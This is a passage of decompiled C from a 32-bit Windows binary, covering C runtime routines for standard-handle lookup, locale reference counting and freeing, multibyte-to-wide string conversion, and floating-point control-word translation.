            int32_t * v2 = (int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40dedf
            int32_t v3 = *v2; // 0x40dedf
            if ((*(char *)(v1 + 40 + v3) & 1) != 0) {
                int32_t v4 = v1 + 24; // 0x40deed
                if (*(int32_t *)(v3 + v4) != -1) {
                    // 0x40def4
                    int32_t v5; // 0x40debb
                    int32_t v6; // 0x40debb
                    int32_t v7; // 0x40debb
                    int32_t v8; // 0x40debb
                    if (function_40ab46(v5, v6, v8, v7) != 1) {
                        // 0x40df21
                        *(int32_t *)(*v2 + v4) = -1;
                        // 0x40df47
                        return 0;
                    }
                    int32_t nStdHandle = -10; // 0x40df02
                    if (a1 != 0) {
                        int32_t v9 = a1 - 1; // 0x40df04
                        nStdHandle = -11;
                        if (v9 != 0) {
                            // 0x40df09
                            nStdHandle = -12;
                            if (v9 != 1) {
                                // 0x40df21
                                *(int32_t *)(*v2 + v4) = -1;
                                // 0x40df47
                                return 0;
                            }
                        }
                    }
                    // 0x40df1b
                    SetStdHandle(nStdHandle, NULL);
                    // 0x40df21
                    *(int32_t *)(*v2 + v4) = -1;
                    // 0x40df47
                    return 0;
                }
            }
        }
    }
    // 0x40df31
    *(int32_t *)function_40b091() = 9;
    *(int32_t *)function_40b07e() = 0;
    // 0x40df47
    return -1;
}

// Address range: 0x40df4c - 0x40dfb6
int32_t function_40df4c(uint32_t a1) {
    if (a1 == -2) {
        // 0x40df59
        *(int32_t *)function_40b07e() = 0;
        *(int32_t *)function_40b091() = 9;
        // 0x40dfb1
        return -1;
    }
    if ((int32_t)a1 < 0 || (uint32_t)g209 <= a1) {
        // 0x40df99
        *(int32_t *)function_40b07e() = 0;
        *(int32_t *)function_40b091() = 9;
        // 0x40dfb1
        return -1;
    }
    int32_t v1 = *(int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40df85
    int32_t v2 = v1 + 48 * (a1 & 63);
    if ((*(char *)(v2 + 40) & 1) != 0) {
        // 0x40df93
        return *(int32_t *)(v2 + 24);
    }
    // 0x40df99
    *(int32_t *)function_40b07e() = 0;
    *(int32_t *)function_40b091() = 9;
    // 0x40dfb1
    return -1;
}

// Address range: 0x40dfb6 - 0x40e0b4
int32_t function_40dfb6(int32_t a1) {
    if (a1 == 0) {
        // 0x40e0b1
        int32_t result; // 0x40dfb6
        return result;
    }
    int32_t v1 = *(int32_t *)(a1 + 12); // 0x40dfc7
    if (v1 != *(int32_t *)0x426714) {
        // 0x40dfd2
        function_40c15c(v1);
    }
    int32_t v2 = *(int32_t *)(a1 + 16); // 0x40dfd9
    if (v2 != *(int32_t *)0x426718) {
        // 0x40dfe4
        function_40c15c(v2);
    }
    int32_t v3 = *(int32_t *)(a1 + 20); // 0x40dfeb
    if (v3 != *(int32_t *)0x42671c) {
        // 0x40dff6
        function_40c15c(v3);
    }
    // 0x40dffd
    int32_t v4; // bp-8, 0x40dfb6
    int32_t v5 = &v4; // 0x40dfbb
    int32_t v6 = *(int32_t *)(a1 + 24); // 0x40dffd
    if (v6 != *(int32_t *)0x426720) {
        // 0x40e008
        *(int32_t *)(v5 - 4) = v6;
        function_40c15c((int32_t)&g266);
    }
    int32_t v7 = *(int32_t *)(a1 + 28); // 0x40e00f
    if (v7 != *(int32_t *)0x426724) {
        // 0x40e01a
        *(int32_t *)(v5 - 4) = v7;
        function_40c15c((int32_t)&g266);
    }
    int32_t v8 = *(int32_t *)(a1 + 32); // 0x40e021
    if (v8 != *(int32_t *)0x426728) {
        // 0x40e02c
        *(int32_t *)(v5 - 4) = v8;
        function_40c15c((int32_t)&g266);
    }
    int32_t v9 = *(int32_t *)(a1 + 36); // 0x40e033
    if (v9 != (int32_t)g136) {
        // 0x40e03e
        *(int32_t *)(v5 - 4) = v9;
        function_40c15c((int32_t)&g266);
    }
    int32_t v10 = *(int32_t *)(a1 + 56); // 0x40e045
    if (v10 != *(int32_t *)0x426740) {
        // 0x40e050
        *(int32_t *)(v5 - 4) = v10;
        function_40c15c((int32_t)&g266);
    }
    int32_t v11 = *(int32_t *)(a1 + 60); // 0x40e057
    if (v11 != *(int32_t *)0x426744) {
        // 0x40e062
        *(int32_t *)(v5 - 4) = v11;
        function_40c15c((int32_t)&g266);
    }
    int32_t v12 = *(int32_t *)(a1 + 64); // 0x40e069
    if (v12 != *(int32_t *)0x426748) {
        // 0x40e074
        *(int32_t *)(v5 - 4) = v12;
        function_40c15c((int32_t)&g266);
    }
    int32_t v13 = *(int32_t *)(a1 + 68); // 0x40e07b
    if (v13 != *(int32_t *)0x42674c) {
        // 0x40e086
        *(int32_t *)(v5 - 4) = v13;
        function_40c15c((int32_t)&g266);
    }
    int32_t v14 = *(int32_t *)(a1 + 72); // 0x40e08d
    if (v14 != *(int32_t *)0x426750) {
        // 0x40e098
        *(int32_t *)(v5 - 4) = v14;
        function_40c15c((int32_t)&g266);
    }
    int32_t v15 = *(int32_t *)(a1 + 76); // 0x40e09f
    int32_t result2 = v15; // 0x40e0a8
    if (v15 != (int32_t)g138) {
        // 0x40e0aa
        *(int32_t *)(v5 - 4) = v15;
        result2 = function_40c15c((int32_t)&g266);
    }
    // 0x40e0b1
    return result2;
}

// Address range: 0x40e0b4 - 0x40e11d
int32_t function_40e0b4(int32_t a1) {
    if (a1 == 0) {
        // 0x40e11a
        int32_t result; // 0x40e0b4
        return result;
    }
    int32_t v1 = *(int32_t *)a1; // 0x40e0c1
    if (v1 != *(int32_t *)0x426708) {
        // 0x40e0cb
        function_40c15c(v1);
    }
    int32_t v2 = *(int32_t *)(a1 + 4); // 0x40e0d2
    if (v2 != *(int32_t *)0x42670c) {
        // 0x40e0dd
        function_40c15c(v2);
    }
    int32_t v3 = *(int32_t *)(a1 + 8); // 0x40e0e4
    if (v3 != (int32_t)g135) {
        // 0x40e0ef
        function_40c15c(v3);
    }
    // 0x40e0f6
    int32_t v4; // bp-8, 0x40e0b4
    int32_t v5 = &v4; // 0x40e0b9
    int32_t v6 = *(int32_t *)(a1 + 48); // 0x40e0f6
    if (v6 != *(int32_t *)0x426738) {
        // 0x40e101
        *(int32_t *)(v5 - 4) = v6;
        function_40c15c((int32_t)&g266);
    }
    int32_t v7 = *(int32_t *)(a1 + 52); // 0x40e108
    int32_t result2 = v7; // 0x40e111
    if (v7 != (int32_t)g137) {
        // 0x40e113
        *(int32_t *)(v5 - 4) = v7;
        result2 = function_40c15c((int32_t)&g266);
    }
    // 0x40e11a
    return result2;
}

// Address range: 0x40e11d - 0x40e159
int32_t function_40e11d(uint32_t a1, int32_t a2) {
    int32_t result = 4 * a2 + a1; // 0x40e12d
    int32_t v1 = a2 & 0x3fffffff; // 0x40e137
    if (v1 == 0 || result < a1) {
        // 0x40e154
        return result;
    }
    int32_t v2 = a1; // 0x40e11d
    int32_t v3 = 0; // 0x40e14b
    int32_t v4; // bp-16, 0x40e11d
    *(int32_t *)((int32_t)&v4 - 4) = *(int32_t *)v2;
    int32_t result2 = function_40c15c((int32_t)&g266); // 0x40e146
    v3++;
    v2 += 4;
    while (v3 != v1) {
        // 0x40e144
        *(int32_t *)((int32_t)&v4 - 4) = *(int32_t *)v2;
        result2 = function_40c15c((int32_t)&g266);
        v3++;
        v2 += 4;
    }
    // 0x40e154
    return result2;
}

// Address range: 0x40e159 - 0x40e23d
int32_t function_40e159(int32_t a1, int32_t a2, int32_t a3) {
    int32_t result; // 0x40e159
    if (a1 != 0) {
        // 0x40e16a
        function_40e11d(a1, 7);
        function_40e11d(a1 + 28, 7);
        function_40e11d(a1 + 56, 12);
        function_40e11d(a1 + 104, 12);
        function_40e11d(a1 + 152, 2);
        function_40c15c(*(int32_t *)(a1 + 160));
        function_40c15c(*(int32_t *)(a1 + 164));
        function_40c15c(*(int32_t *)(a1 + 168));
        function_40e11d(a1 + 180, 7);
        function_40e11d(a1 + 208, 7);
        function_40e11d(a1 + 236, 12);
        function_40e11d(a1 + 284, 12);
        function_40e11d(a1 + 332, 2);
        function_40c15c(*(int32_t *)(a1 + 340));
        function_40c15c(*(int32_t *)(a1 + 344));
        function_40c15c(*(int32_t *)(a1 + 348));
        result = function_40c15c(*(int32_t *)(a1 + 352));
    }
    // 0x40e23a
    return result;
}

// Address range: 0x40e23d - 0x40e35a
int32_t function_40e23d(int32_t a1, int32_t dwInfoType, char * lpMultiByteStr, int32_t cbMultiByte, int32_t * lpCharType, int32_t a6, int32_t a7) {
    // 0x40e23d
    int32_t v1; // 0x40e23d
    function_409954(a1, v1);
    int32_t CodePage = a6; // 0x40e262
    if (a6 == 0) {
        // 0x40e264
        int32_t v2; // 0x40e23d
        CodePage = *(int32_t *)(v2 + 8);
    }
    int32_t v3 = CodePage; // bp-68, 0x40e289
    int32_t cchWideChar = MultiByteToWideChar(CodePage, 8 * (int32_t)(a7 != 0) | 1, lpMultiByteStr, cbMultiByte, NULL, 0); // 0x40e28a
    int32_t v4; // 0x40e23d
    int32_t v5; // 0x40e23d
    int32_t v6; // 0x40e23d
    int32_t v7; // 0x40e289
    uint32_t v8; // 0x40e29b
    if (cchWideChar == 0) {
        goto lab_0x40e334;
    } else {
        // 0x40e29b
        v7 = &v3;
        v8 = 2 * cchWideChar;
        v6 = v7;
        v5 = 0;
        if (v8 > 0xfffffff7) {
            goto lab_0x40e32d;
        } else {
            uint32_t v9 = v8 + 8; // 0x40e2a9
            if (v9 < 1025) {
                // 0x40e2bc
                function_411b10();
                v3 = 0xcccc;
                v4 = v7;
                goto lab_0x40e2f5;
            } else {
                int32_t v10 = function_40c196(v9); // 0x40e2dc
                v6 = v7;
                v5 = 0;
                if (v10 == 0) {
                    goto lab_0x40e32d;
                } else {
                    // 0x40e2e8
                    *(int32_t *)v10 = 0xdddd;
                    v4 = v10;
                    goto lab_0x40e2f5;
                }
            }
        }
    }
  lab_0x40e334:;
    char v11; // 0x40e23d
    if (v11 != 0) {
        // 0x40e33a
        int32_t v12; // 0x40e23d
        int32_t * v13 = (int32_t *)(v12 + 848); // 0x40e33d
        *v13 = *v13 & -3;
    }
    // 0x40e344
    return function_406b2c();
  lab_0x40e32d:
    // 0x40e32d
    *(int32_t *)(v6 - 4) = v5;
    function_40e35a((int32_t)&g266);
    goto lab_0x40e334;
  lab_0x40e2f5:;
    int32_t v14 = v4 + 8; // 0x40e2ee
    v6 = v7;
    v5 = 0;
    if (v14 != 0) {
        // 0x40e2f9
        function_407730(v14, 0, v8);
        int16_t * lpWideCharStr = (int16_t *)v14; // 0x40e307
        int32_t v15 = CodePage; // bp-92, 0x40e310
        int32_t cchSrc = MultiByteToWideChar(CodePage, 1, lpMultiByteStr, cbMultiByte, lpWideCharStr, cchWideChar); // 0x40e313
        v6 = &v15;
        v5 = v14;
        if (cchSrc != 0) {
            int32_t v16 = dwInfoType; // bp-108, 0x40e322
            GetStringTypeW(dwInfoType, lpWideCharStr, cchSrc, (int16_t *)lpCharType);
            v6 = &v16;
            v5 = v14;
        }
    }
    goto lab_0x40e32d;
}

// Address range: 0x40e35a - 0x40e37a
int32_t function_40e35a(int32_t a1) {
    // 0x40e35a
    if (a1 == 0) {
        // 0x40e378
        return 0;
    }
    int32_t v1 = a1 - 8; // 0x40e366
    int32_t result = v1; // 0x40e36f
    if (*(int32_t *)v1 == 0xdddd) {
        // 0x40e371
        result = function_40c15c(v1);
    }
    // 0x40e378
    return result;
}

// Address range: 0x40e37a - 0x40e3f7
int32_t function_40e37a(int32_t a1) {
    int32_t * v1 = (int32_t *)(a1 + 12); // 0x40e382
    *v1 = *v1 + 1;
    int32_t v2 = *(int32_t *)(a1 + 124); // 0x40e386
    if (v2 != 0) {
        int32_t * v3 = (int32_t *)v2; // 0x40e38d
        *v3 = *v3 + 1;
    }
    int32_t v4 = *(int32_t *)(a1 + 132); // 0x40e390
    if (v4 != 0) {
        int32_t * v5 = (int32_t *)v4; // 0x40e39a
        *v5 = *v5 + 1;
    }
    int32_t v6 = *(int32_t *)(a1 + 128); // 0x40e39d
    if (v6 != 0) {
        int32_t * v7 = (int32_t *)v6; // 0x40e3a7
        *v7 = *v7 + 1;
    }
    int32_t v8 = *(int32_t *)(a1 + 140); // 0x40e3aa
    if (v8 != 0) {
        int32_t * v9 = (int32_t *)v8; // 0x40e3b4
        *v9 = *v9 + 1;
    }
    int32_t v10 = 6; // 0x40e3bd
    int32_t v11 = a1 + 40;
    int32_t v12; // 0x40e3c7
    int32_t * v13; // 0x40e3cd
    if (*(int32_t *)(v11 - 8) != (int32_t)&g124) {
        // 0x40e3c7
        v12 = *(int32_t *)v11;
        if (v12 != 0) {
            // 0x40e3cd
            v13 = (int32_t *)v12;
            *v13 = *v13 + 1;
        }
    }
    // 0x40e3d0
    int32_t v14; // 0x40e3d6
    int32_t * v15; // 0x40e3dd
    if (*(int32_t *)(v11 - 12) != 0) {
        // 0x40e3d6
        v14 = *(int32_t *)(v11 - 4);
        if (v14 != 0) {
            // 0x40e3dd
            v15 = (int32_t *)v14;
            *v15 = *v15 + 1;
        }
    }
    // 0x40e3e0
    v10--;
    int32_t v16 = v11 + 16; // 0x40e3e6
    while (v10 != 0) {
        // 0x40e3be
        v11 = v16;
        if (*(int32_t *)(v11 - 8) != (int32_t)&g124) {
            // 0x40e3c7
            v12 = *(int32_t *)v11;
            if (v12 != 0) {
                // 0x40e3cd
                v13 = (int32_t *)v12;
                *v13 = *v13 + 1;
            }
        }
        // 0x40e3d0
        if (*(int32_t *)(v11 - 12) != 0) {
            // 0x40e3d6
            v14 = *(int32_t *)(v11 - 4);
            if (v14 != 0) {
                // 0x40e3dd
                v15 = (int32_t *)v14;
                *v15 = *v15 + 1;
            }
        }
        // 0x40e3e0
        v10--;
        v16 = v11 + 16;
    }
    // 0x40e3e8
    return function_40e541(*(int32_t *)(a1 + 156));
}

// Address range: 0x40e3f7 - 0x40e541
int32_t function_40e3f7(int32_t a1) {
    int32_t * v1 = (int32_t *)(a1 + 136); // 0x40e403
    int32_t v2 = *v1; // 0x40e403
    if (v2 != 0 && v2 != (int32_t)&g134) {
        int32_t * v3 = (int32_t *)(a1 + 124); // 0x40e414
        int32_t v4 = *v3; // 0x40e414
        if (v4 != 0) {
            // 0x40e41b
            if (*(int32_t *)v4 == 0) {
                int32_t v5 = *(int32_t *)(a1 + 132); // 0x40e420
                if (v5 != 0) {
                    // 0x40e42a
                    if (*(int32_t *)v5 == 0) {
                        // 0x40e42f
                        function_40c15c(v5);
                        function_40dfb6(*v1);
                    }
                }
                int32_t v6 = *(int32_t *)(a1 + 128); // 0x40e442
                if (v6 != 0) {
                    // 0x40e44c
                    if (*(int32_t *)v6 == 0) {
                        // 0x40e451
                        function_40c15c(v6);
                        function_40e0b4(*v1);
                    }
                }
                // 0x40e464
                function_40c15c(*v3);
                function_40c15c(*v1);
            }
        }
    }
    int32_t * v7 = (int32_t *)(a1 + 140); // 0x40e479
    int32_t v8 = *v7; // 0x40e479
    if (v8 != 0) {
        // 0x40e483
        if (*(int32_t *)v8 == 0) {
            // 0x40e488
            function_40c15c(*(int32_t *)(a1 + 144) - 254);
            function_40c15c(*(int32_t *)(a1 + 148) - 128);
            function_40c15c(*(int32_t *)(a1 + 152) - 128);
            function_40c15c(*v7);
        }
    }
    // 0x40e4c8
    function_40e56a(*(int32_t *)(a1 + 156));
    int32_t v9; // bp-20, 0x40e3f7
    int32_t v10 = &v9; // 0x40e4d6
    int32_t * v11 = (int32_t *)(v10 - 4);
    int32_t v12 = a1 + 40;
    int32_t v13 = a1 + 160;
    int32_t v14 = 6;
    int32_t v15; // 0x40e4ec
    if (*(int32_t *)(v12 - 8) != (int32_t)&g124) {
        // 0x40e4ec
        v15 = *(int32_t *)v12;
        if (v15 != 0) {
            // 0x40e4f2
            if (*(int32_t *)v15 == 0) {
                // 0x40e4f7
                *v11 = v15;
                function_40c15c(v14);
                *(int32_t *)(v10 - 8) = *(int32_t *)v13;
                function_40c15c((int32_t)&g266);
            }
        }
    }
    // 0x40e509
    int32_t v16; // 0x40e50f
    if (*(int32_t *)(v12 - 12) != 0) {
        // 0x40e50f
        v16 = *(int32_t *)(v12 - 4);
        if (v16 != 0) {
            // 0x40e516
            if (*(int32_t *)v16 == 0) {
                // 0x40e51b
                *v11 = v16;
                function_40c15c((int32_t)&g266);
            }
        }
    }
    int32_t v17 = v14 - 1; // 0x40e52b
    int32_t v18 = v13 + 4; // 0x40e531
    int32_t v19 = v12 + 16; // 0x40e531
    while (v17 != 0) {
        // 0x40e4e3
        v12 = v19;
        v13 = v18;
        v14 = v17;
        if (*(int32_t *)(v12 - 8) != (int32_t)&g124) {
            // 0x40e4ec
            v15 = *(int32_t *)v12;
            if (v15 != 0) {
                // 0x40e4f2
                if (*(int32_t *)v15 == 0) {
                    // 0x40e4f7
                    *v11 = v15;
                    function_40c15c(v14);
                    *(int32_t *)(v10 - 8) = *(int32_t *)v13;
                    function_40c15c((int32_t)&g266);
                }
            }
        }
        // 0x40e509
        if (*(int32_t *)(v12 - 12) != 0) {
            // 0x40e50f
            v16 = *(int32_t *)(v12 - 4);
            if (v16 != 0) {
                // 0x40e516
                if (*(int32_t *)v16 == 0) {
                    // 0x40e51b
                    *v11 = v16;
                    function_40c15c((int32_t)&g266);
                }
            }
        }
        // 0x40e525
        v17 = v14 - 1;
        v18 = v13 + 4;
        v19 = v12 + 16;
    }
    // 0x40e533
    *v11 = a1;
    return function_40c15c(0);
}

// Address range: 0x40e541 - 0x40e56a
int32_t function_40e541(int32_t a1) {
    if (a1 == 0 || a1 == (int32_t)&g36) {
        // 0x40e563
        return 0x7fffffff;
    }
    int32_t * v1 = (int32_t *)(a1 + 176); // 0x40e558
    int32_t result = *v1 + 1; // 0x40e558
    *v1 = result;
    return result;
}

// Address range: 0x40e56a - 0x40e59a
int32_t function_40e56a(int32_t a1) {
    // 0x40e56a
    int32_t result; // 0x40e56a
    if (a1 == 0 || a1 == (int32_t)&g36) {
        // 0x40e597
        return result;
    }
    int32_t v1 = *(int32_t *)(a1 + 176); // 0x40e57f
    result = v1;
    if (v1 == 0) {
        // 0x40e589
        int32_t v2; // 0x40e56a
        int32_t v3; // 0x40e56a
        function_40e159(a1, v2, v3);
        result = function_40c15c(a1);
    }
    // 0x40e597
    return result;
}

// Address range: 0x40e59a - 0x40e5c3
int32_t function_40e59a(int32_t a1) {
    if (a1 == 0 || a1 == (int32_t)&g36) {
        // 0x40e5bc
        return 0x7fffffff;
    }
    int32_t * v1 = (int32_t *)(a1 + 176); // 0x40e5b1
    int32_t result = *v1 - 1; // 0x40e5b1
    *v1 = result;
    return result;
}

// Address range: 0x40e5c3 - 0x40e644
int32_t function_40e5c3(int32_t a1) {
    // 0x40e5c3
    if (a1 == 0) {
        // 0x40e642
        return 0;
    }
    int32_t * v1 = (int32_t *)(a1 + 12); // 0x40e5cf
    *v1 = *v1 - 1;
    int32_t v2 = *(int32_t *)(a1 + 124); // 0x40e5d3
    if (v2 != 0) {
        int32_t * v3 = (int32_t *)v2; // 0x40e5da
        *v3 = *v3 - 1;
    }
    int32_t v4 = *(int32_t *)(a1 + 132); // 0x40e5dd
    if (v4 != 0) {
        int32_t * v5 = (int32_t *)v4; // 0x40e5e7
        *v5 = *v5 - 1;
    }
    int32_t v6 = *(int32_t *)(a1 + 128); // 0x40e5ea
    if (v6 != 0) {
        int32_t * v7 = (int32_t *)v6; // 0x40e5f4
        *v7 = *v7 - 1;
    }
    int32_t v8 = *(int32_t *)(a1 + 140); // 0x40e5f7
    if (v8 != 0) {
        int32_t * v9 = (int32_t *)v8; // 0x40e601
        *v9 = *v9 - 1;
    }
    int32_t v10 = 6; // 0x40e60a
    int32_t v11 = a1 + 40;
    int32_t v12; // 0x40e614
    int32_t * v13; // 0x40e61a
    if (*(int32_t *)(v11 - 8) != (int32_t)&g124) {
        // 0x40e614
        v12 = *(int32_t *)v11;
        if (v12 != 0) {
            // 0x40e61a
            v13 = (int32_t *)v12;
            *v13 = *v13 - 1;
        }
    }
    // 0x40e61d
    int32_t v14; // 0x40e623
    int32_t * v15; // 0x40e62a
    if (*(int32_t *)(v11 - 12) != 0) {
        // 0x40e623
        v14 = *(int32_t *)(v11 - 4);
        if (v14 != 0) {
            // 0x40e62a
            v15 = (int32_t *)v14;
            *v15 = *v15 - 1;
        }
    }
    // 0x40e62d
    v10--;
    int32_t v16 = v11 + 16; // 0x40e633
    while (v10 != 0) {
        // 0x40e60b
        v11 = v16;
        if (*(int32_t *)(v11 - 8) != (int32_t)&g124) {
            // 0x40e614
            v12 = *(int32_t *)v11;
            if (v12 != 0) {
                // 0x40e61a
                v13 = (int32_t *)v12;
                *v13 = *v13 - 1;
            }
        }
        // 0x40e61d
        if (*(int32_t *)(v11 - 12) != 0) {
            // 0x40e623
            v14 = *(int32_t *)(v11 - 4);
            if (v14 != 0) {
                // 0x40e62a
                v15 = (int32_t *)v14;
                *v15 = *v15 - 1;
            }
        }
        // 0x40e62d
        v10--;
        v16 = v11 + 16;
    }
    // 0x40e642
    return function_40e59a(*(int32_t *)(a1 + 156));
}

// Address range: 0x40e644 - 0x40e6bb
int32_t function_40e644(int32_t a1, int32_t a2) {
    // 0x40e644
    function_406cf0(&g105, 12, (int32_t)&g266);
    int32_t v1; // 0x40e644
    int32_t * v2 = (int32_t *)(v1 - 28); // 0x40e650
    *v2 = 0;
    int32_t v3 = function_40bfb3(); // 0x40e654
    int32_t * v4 = (int32_t *)(v3 + 76);
    int32_t result; // 0x40e6b5
    if ((*(int32_t *)(v3 + 848) & (int32_t)g139) != 0) {
        // 0x40e669
        if (*v4 != 0) {
            // 0x40e6b3
            result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            return result;
        }
    }
    // 0x40e670
    function_40c527(4);
    int32_t * v5 = (int32_t *)(v1 - 4); // 0x40e678
    *v5 = 0;
    int32_t v6 = function_40e6bb(v4, g206); // 0x40e686
    *v2 = v6;
    *v5 = -2;
    function_40e6aa();
    if (v6 == 0) {
        // 0x40e6a2
        function_40af0b();
        // UNREACHABLE
    }
    // 0x40e6b3
    result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x40e6aa - 0x40e6b3
int32_t function_40e6aa(void) {
    // 0x40e6aa
    return function_40c56f(4);
}

// Address range: 0x40e6bb - 0x40e70b
int32_t function_40e6bb(int32_t * a1, int32_t result) {
    // 0x40e6bb
    if (a1 == NULL || result == 0) {
        // 0x40e707
        return 0;
    }
    int32_t v1 = *a1; // 0x40e6d0
    if (v1 == result) {
        // 0x40e707
        return result;
    }
    // 0x40e6da
    *a1 = result;
    function_40e37a(result);
    if (v1 == 0) {
        // 0x40e707
        return result;
    }
    // 0x40e6e7
    function_40e5c3(v1);
    if (v1 != (int32_t)&g122 && *(int32_t *)(v1 + 12) == 0) {
        // 0x40e6fc
        function_40e3f7(v1);
    }
    // 0x40e707
    return result;
}

// Address range: 0x40e70b - 0x40e7b6
int32_t function_40e70b(uint32_t a1) {
    int32_t v1 = 64 * a1 & 512 | 8 * a1 & 128 | 256 * a1 & 1024 | 1024 * a1 & 2048 | 0x1000 * a1 & 0x1000 | a1 / 2048 & 256;
    int32_t v2 = a1 & 768; // 0x40e762
    int32_t result = v1; // 0x40e70b
    int32_t v3; // 0x40e78b
    switch (v2) {
        case 256: {
            // 0x40e780
            result = v1 | 0x2000;
        }
        case 0: {
          lab_0x40e785:
            // 0x40e785
            v3 = a1 & 0x3000000;
            switch (v3) {
                case 0x1000000: {
                    // 0x40e7b4
                    return result | 0x8040;
                }
                case 0x2000000: {
                    // 0x40e7aa
                    return result | 64;
                }
            }
            // break -> 0x40e79f
            break;
        }
        case 512: {
            // 0x40e779
            result = v1 | 0x4000;
            // branch (via goto) -> 0x40e785
            goto lab_0x40e785;
        }
        default: {
            // 0x40e76e
            result = v2 != 768 ? v1 : v1 | 0x6000;
            // branch (via goto) -> 0x40e785
            goto lab_0x40e785;
        }
    }
    // 0x40e79f
    if (v3 == 0x3000000) {
        // 0x40e7a3
        return result | 0x8000;
    }
    // 0x40e7b4
    return result;
}

// Address range: 0x40e7b6 - 0x40eab8
int32_t function_40e7b6(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40e7b6
    __asm_wait();
    uint16_t v1; // 0x40e7b6
    uint32_t v2 = (int32_t)v1; // 0x40e7c2
    int32_t v3 = 2 * v2 & 8 | (int32_t)(16 * v1 & 16) | v2 / 2 & 4 | v2 / 8 & 2 | v2 / 32 & 1 | 0x40000 * v2 & 0x80000;
    int32_t v4 = v2 & 3072; // 0x40e807
    int32_t v5 = v3; // 0x40e7b6
    int32_t v6; // 0x40e7b6
    switch (v4) {
        case 1024: {
            // 0x40e82b
            v5 = v3 | 256;
        }
        case 0: {
          lab_0x40e831:;
            int32_t v7 = v5;
            int32_t v8 = v2 & 768; // 0x40e831
            if (v8 == 0) {
                // 0x40e845
                v6 = v7 | 0x20000;
            } else {
                // 0x40e839
                v6 = v8 != 512 ? v7 : v7 | 0x10000;
            }
            // break -> 0x40e84b
            break;
        }
        case 2048: {
            // 0x40e827
            v5 = v3 | 512;
            // branch (via goto) -> 0x40e831
            goto lab_0x40e831;
        }
        default: {
            // 0x40e81b
            v5 = v4 != 3072 ? v3 : v3 | 768;
            // branch (via goto) -> 0x40e831
            goto lab_0x40e831;
        }
    }
    int32_t v9 = v6 | 64 * v2 & 0x40000;
    int32_t v10 = v9 & (a2 ^ -1) | a2 & a1; // 0x40e869
    int32_t result = v9; // 0x40e86d
    if (v10 != v9) {
        // 0x40e873
        int32_t v11; // 0x40e7b6
        int32_t v12; // 0x40e7b6
        int32_t v13; // 0x40e7b6
        uint32_t v14 = function_40eab8(v10, v11, v12, v13); // 0x40e874
        __asm_wait();
        int32_t v15 = 2 * v14 & 8 | 16 * v14 & 16 | v14 / 2 & 4 | v14 / 8 & 2 | v14 / 32 & 1 | 0x40000 * v14 & 0x80000;
        int32_t v16 = v14 & 3072; // 0x40e8bd
        int32_t v17 = v15; // 0x40e7b6
        int32_t v18; // 0x40e7b6
        switch (v16) {
            case 1024: {
                // 0x40e8e5
                v17 = v15 | 256;
            }
            case 0: {
              lab_0x40e8eb:;
                int32_t v19 = v17;
                int32_t v20 = v14 & 768; // 0x40e8eb
                if (v20 == 0) {
                    // 0x40e903
                    v18 = v19 | 0x20000;
                } else {
                    // 0x40e8f3
                    v18 = v20 != 512 ? v19 : v19 | 0x10000;
                }
                // break -> 0x40e909
                break;
            }
            case 2048: {
                // 0x40e8dd
                v17 = v15 | 512;
                // branch (via goto) -> 0x40e8eb
                goto lab_0x40e8eb;
            }
            default: {
                // 0x40e8d1
                v17 = v16 != 3072 ? v15 : v15 | 768;
                // branch (via goto) -> 0x40e8eb
                goto lab_0x40e8eb;
            }
        }
        // 0x40e909
        result = v18 | 64 * v14 & 0x40000;
    }
    // 0x40e919
    if (g162 < 1) {
        // 0x40eab1
        return result;
    }
    // 0x40e926
    char v21; // 0x40e7b6
    uint32_t v22 = (int32_t)v21; // 0x40e92c
    __asm_stmxcsr(v22);
    int32_t v23 = v21 >= 0 ? 0 : 16;
    int32_t v24 = v22 / 64 & 8 | v23 | v22 / 256 & 4 | v22 / 1024 & 2 | v22 / 0x1000 & 1 | 2048 * v22 & 0x80000;
    int32_t v25 = v22 & 0x6000; // 0x40e975
    int32_t v26 = v24; // 0x40e7b6
    int32_t v27; // 0x40e7b6
    int32_t v28; // 0x40e801
    int32_t * v29; // 0x40e9a3
    switch (v25) {
        case 0x2000: {
            // 0x40e99d
            v26 = v24 | 256;
        }
        case 0: {
          lab_0x40e9a3:;
            // 0x40e9a3
            int32_t v30; // bp-32, 0x40e7b6
            v28 = &v30;
            int32_t v31 = v26;
            v29 = (int32_t *)(v28 - 4);
            *v29 = 64;
            int32_t v32 = v22 & 0x8040; // 0x40e9a5
            if (v32 == 64) {
                // 0x40e9ca
                v27 = v31 | 0x2000000;
            } else {
                int32_t v33 = v32 - 0x8000; // 0x40e9af
                if (v33 == 0) {
                    // 0x40e9c2
                    v27 = v31 | 0x3000000;
                } else {
                    // 0x40e9b6
                    v27 = v33 != 64 ? v31 : v31 | 0x1000000;
                }
            }
            // break -> 0x40e9d0
            break;
        }
        case 0x4000: {
            // 0x40e995
            v26 = v24 | 512;
            // branch (via goto) -> 0x40e9a3
            goto lab_0x40e9a3;
        }
        default: {
            // 0x40e989
            v26 = v25 != 0x6000 ? v24 : v24 | 768;
            // branch (via goto) -> 0x40e9a3
            goto lab_0x40e9a3;
        }
    }
    int32_t v34 = a2 & 0x308031f; // 0x40e926
    int32_t v35 = v27 & (v34 ^ -1) | v34 & a1; // 0x40e9d9
    int32_t v36 = v27; // 0x40e9dd
    if (v35 != v27) {
        // 0x40e9e3
        *v29 = v35;
        uint32_t v37 = function_40e70b((int32_t)&g266); // 0x40e9e4
        *(int32_t *)(v28 - 8) = v37;
        function_40f8ef(v37);
        __asm_stmxcsr(v37);
        int32_t v38 = 0; // 0x40e9ff
        if ((char)v37 < 0) {
            // 0x40ea01
            *v29 = 16;
            v38 = 16;
        }
        int32_t v39 = v37 / 256 & 4 | v37 / 64 & 8 | v37 / 1024 & 2 | v37 / 0x1000 & 1 | 2048 * v37 & 0x80000 | v38;
        int32_t v40 = v37 & 0x6000; // 0x40ea40
        int32_t v41 = v39; // 0x40e7b6
        switch (v40) {
            case 0x2000: {
                // 0x40ea68
                v41 = v39 | 256;
            }
            case 0: {
              lab_0x40ea6e:;
                int32_t v42 = v41;
                int32_t v43 = v37 & 0x8040; // 0x40ea6e
                if (v43 == 64) {
                    // 0x40ea92
                    v36 = v42 | 0x2000000;
                } else {
                    int32_t v44 = v43 - 0x8000; // 0x40ea77
                    if (v44 == 0) {
